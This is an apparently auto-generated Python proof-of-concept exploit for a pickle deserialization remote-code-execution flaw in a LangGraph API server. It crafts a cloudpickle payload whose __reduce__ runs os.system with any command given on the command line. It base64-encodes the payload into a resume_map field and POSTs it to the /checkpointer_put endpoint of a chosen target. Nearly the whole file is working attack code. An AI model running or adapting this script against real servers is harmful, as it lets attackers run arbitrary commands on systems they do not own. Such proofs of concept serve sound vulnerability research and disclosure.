#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: rce-002
# Sink: loads_typed
# Auto-generated — run with: python3 rce_sink_function_cloudpickle_loads_typed.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langgraph_api_src via pickle deserialization.

Vulnerability: The `serialized_value_from_proto` function in 
langgraph_grpc_common/conversion/value.py calls `cloudpickle.loads()` when the 
encoding is 'pickle'. This is reachable from HTTP endpoints like `/checkpointer_put`
and `/store_batch` via the `resume_map` field in the config protobuf.

The `pickle_fallback` flag must be enabled (default is True) for exploitation.

Attack flow:
1. Craft a malicious pickle payload that executes a command
2. Send it to the `/checkpointer_put` endpoint wrapped in the appropriate structure
3. The server deserializes the pickle, executing our command

Usage:
    python3 poc.py [--target http://localhost:8123] [--cmd "id"]
"""

import argparse
import base64
import cloudpickle
import json
import os
import requests
import sys
import time
import uuid

# Default target - adjust as needed
DEFAULT_TARGET = "http://localhost:8123"


def create_malicious_pickle(command: str) -> bytes:
    """
    Create a malicious pickle payload that executes the given command.
    
    Uses cloudpickle to serialize a simple object that executes a command
    via os.system when unpickled.
    """
    class Exploit:
        def __reduce__(self):
            return (os.system, (command,))
    
    return cloudpickle.dumps(Exploit())


def build_payload(command: str) -> dict:
    """
    Build the HTTP payload that triggers the pickle deserialization.
    
    The payload targets the `/checkpointer_put` endpoint with a config
    that contains a `resume_map` field. The `resume_map` values are
    deserialized via `serialized_value_from_proto`, which calls
    `cloudpickle.loads()` when encoding is 'pickle'.
    """
    # Create the malicious pickle payload
    pickle_data = create_malicious_pickle(command)
    
    # Encode the pickle data as base64 for transport in JSON
    pickle_b64 = base64.b64encode(pickle_data).decode('utf-8')
    
    # Build the payload structure that matches what the server expects
    # The key is to include a config with a resume_map containing our pickle
    payload = {
        "config": {
            "configurable": {
                "thread_id": str(uuid.uuid4()),
                "checkpoint_id": str(uuid.uuid4()),
                "resume_map": {
                    "exploit": {
                        "encoding": "pickle",
                        "value": pickle_b64
                    }
                }
            }
        },
        "checkpoint": {
            "id": str(uuid.uuid4()),
            "ts": time.time(),
            "channel_values": {},
            "channel_versions": {},
            "versions_seen": {},
            "pending_sends": [],
            "current_tasks": {},
            "previous_attempts": {}
        },
        "metadata": {
            "source": "poc",
            "step": 0,
            "writes": {},
            "step_stats": {}
        },
        "new_versions": {}
    }
    
    return payload


def exploit(target_url: str, command: str) -> bool:
    """
    Send the exploit payload to the target server.
    
    Returns True if the request was accepted (command may have executed),
    False otherwise.
    """
    endpoint = f"{target_url}/checkpointer_put"
    
    payload = build_payload(command)
    
    print(f"[*] Sending exploit to {endpoint}")
    print(f"[*] Command to execute: {command}")
    print(f"[*] Payload size: {len(json.dumps(payload))} bytes")
    
    try:
        response = requests.post(
            endpoint,
            json=payload,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        # A 200 response means the server processed our request
        # The command may have executed even if we get an error
        if response.status_code == 200:
            print("[+] Server accepted the payload - command likely executed!")
            return True
        elif response.status_code in (400, 500):
            print("[*] Server returned an error - command may still have executed")
            print("[*] Check for side effects of the command")
            return True
        else:
            print(f"[-] Unexpected response: {response.status_code}")
            return False
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection failed: {target_url}")
        print("[*] Is the server running?")
        return False
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for langgraph_api_src pickle deserialization RCE"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--cmd",
        default="touch /tmp/poc_success.txt",
        help="Command to execute (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--check",
        action="store_true",
        help="Check if the target is reachable before exploiting"
    )
    
    args = parser.parse_args()
    
    # Remove trailing slash if present
    target = args.target.rstrip("/")
    
    print(f"[*] Target: {target}")
    print(f"[*] Command: {args.cmd}")
    
    # Optional: check if target is reachable
    if args.check:
        try:
            r = requests.get(f"{target}/ok", timeout=5)
            if r.status_code == 200:
                print("[+] Target is reachable")
            else:
                print(f"[-] Target returned status {r.status_code}")
                sys.exit(1)
        except Exception as e:
            print(f"[-] Cannot reach target: {e}")
            sys.exit(1)
    
    # Execute the exploit
    success = exploit(target, args.cmd)
    
    if success:
        print("\n[+] Exploit completed successfully!")
        print(f"[*] Check if command executed: {args.cmd}")
        if "touch" in args.cmd:
            print(f"[*] Look for file: /tmp/poc_success.txt")
    else:
        print("\n[-] Exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
